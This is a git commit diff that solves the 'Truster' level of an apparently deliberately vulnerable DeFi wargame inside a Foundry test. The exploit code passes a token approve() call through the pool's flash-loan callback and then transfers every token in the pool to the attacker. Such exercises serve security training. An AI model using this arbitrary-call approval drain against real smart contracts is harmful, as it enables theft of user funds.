27406bee01831782900f613f5a494e43e64353f0
VIELITE <x86_64vielite@proton.me>
2023-06-08 09:32:28 -0400

    Completed Truster :)

--- test/Levels/truster/Truster.t.sol
+++ test/Levels/truster/Truster.t.sol
@@ -9,6 +9,7 @@ import {TrusterLenderPool} from "../../../src/Contracts/truster/TrusterLenderPoo
 
 contract Truster is Test {
     uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;
+    uint256 MAX_INT = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
 
     Utilities internal utils;
     TrusterLenderPool internal trusterLenderPool;
@@ -41,6 +42,17 @@ contract Truster is Test {
         /**
          * EXPLOIT START *
          */
+        bytes memory expl = abi.encodeWithSignature("approve(address,uint256)", attacker, MAX_INT);
+
+        vm.startPrank(attacker);
+
+        trusterLenderPool.flashLoan(0, msg.sender, address(dvt), expl);
+
+        dvt.transferFrom(address(trusterLenderPool), address(attacker), TOKENS_IN_POOL);
+        console.log("balance Of pool:", dvt.balanceOf(address(trusterLenderPool)));
+        console.log("While balance Of Attacker:", dvt.balanceOf(address(attacker)));
+
+        vm.stopPrank();
 
         /**
          * EXPLOIT END *
